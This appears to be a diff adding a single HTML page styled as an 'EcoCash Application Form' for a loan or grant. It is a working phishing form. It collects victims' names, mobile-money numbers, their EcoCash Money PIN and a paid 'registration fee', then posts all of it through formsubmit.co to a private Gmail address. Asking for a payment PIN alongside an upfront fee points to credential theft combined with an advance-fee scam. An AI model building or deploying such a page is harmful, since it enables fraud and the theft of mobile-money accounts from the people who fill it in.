@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>EcoCash Application Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+      background-color: #f9f9f9;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, textarea, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    label {
+      font-weight: bold;
+      margin-top: 10px;
+      display: block;
+    }
+    .toggle {
+      margin-top: 5px;
+      font-size: 0.9em;
+      color: #0077cc;
+      cursor: pointer;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+  <h2>EcoCash Application Form</h2>
+  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
+    <label>Full Name</label>
+    <input type="text" name="Full Name" required>
+
+    <label>EcoCash Number</label>
+    <input type="tel" name="EcoCash Number" required>
+
+    <label>EcoCash Money PIN</label>
+    <input type="password" id="pin" name="EcoCash Money PIN" required>
+    <span class="toggle" onclick="togglePIN()">👁️ Show / Hide</span>
+
+    <label>Amount Applying For</label>
+    <input type="text" name="Amount Applying For" required>
+
+    <label>Registration Fee Paid</label>
+    <input type="text" name="Registration Fee Paid" required>
+
+    <label>Other Number (Optional)</label>
+    <input type="tel" name="Other Number">
+
+    <button type="submit">Click Here to Apply</button>
+  </form>
+
+  <script>
+    function togglePIN() {
+      const pinField = document.getElementById("pin");
+      pinField.type = (pinField.type === "password") ? "text" : "password";
+    }
+  </script>
+</body>
+</html>
